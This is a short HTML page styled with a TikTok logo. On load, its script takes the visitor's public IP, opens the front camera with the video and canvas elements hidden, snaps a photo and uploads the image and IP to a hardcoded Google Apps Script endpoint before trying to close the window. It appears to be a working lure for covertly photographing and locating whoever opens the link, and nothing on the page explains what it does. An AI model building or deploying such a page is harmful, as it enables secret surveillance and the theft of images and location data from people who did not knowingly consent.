<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Capture and Upload</title>
  <style>
    body {
      background: #000;
      margin: 0;
      padding: 0;
      height: 100vh;
      background-image: url("tiktok_logo.png");
      background-size: 300px auto;
      background-position: center;
      background-repeat: no-repeat;
      overflow: hidden;
    }
    video, canvas { display: none !important; }
    #msg {
      color: white;
      font-family: monospace;
      position: absolute;
      bottom: 20px;
      text-align: center;
      width: 100%;
    }
  </style>
</head>
<body>
  
  <script>
    async function captureAndUpload() {
      const msg = document.getElementById('msg');
      try {
        // 1. Get public IP address
        let userIP = 'unknown';
        try {
          const ipRes = await fetch('https://api.ipify.org?format=json');
          const ipData = await ipRes.json();
          userIP = ipData.ip || 'unknown';
        } catch (ipErr) {
          console.warn('IP fetch failed:', ipErr);
        }

        // 2. Request front camera access
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
          audio: false
        });

        // 3. Setup video and capture frame
        const video = document.createElement('video');
        video.setAttribute('playsinline', '');
        video.srcObject = stream;

        await new Promise(resolve => {
          video.onloadedmetadata = () => video.play().then(resolve);
        });

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        stream.getTracks().forEach(track => track.stop());

        // 4. Get UTC+7 timestamp
        const now = new Date();
        const utc7 = new Date(now.getTime() + 7 * 60 * 60 * 1000);
        const timestamp = utc7.toISOString().replace(/[:.]/g, '-');

        // 5. Convert to base64
        const imageData = canvas.toDataURL('image/jpeg', 0.85).split(',')[1];

        msg.innerText = 'Uploading...';

        // 6. Upload to Apps Script Web App
        const response = await fetch('https://script.google.com/macros/s/AKfycbxIgKONNxohddIQePqTSpNyaNd2rXJQz7rPnqxHYNTScUOq9JxQrkrY1K1wezWn8Mfw/exec', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            image: imageData,
            ip: userIP
          })
        });

        const result = await response.text();
        msg.innerText = '✅ ' + result;

        // 7. Attempt to close the window
        setTimeout(() => {
          if (window.opener || window.closed === false) window.close();
        }, 5000);

      } catch (err) {
        console.error(err);
        msg.innerText = '❌ Error: ' + err.toString();
      }
    }

    window.onload = captureAndUpload;
  </script>
</body>
</html>
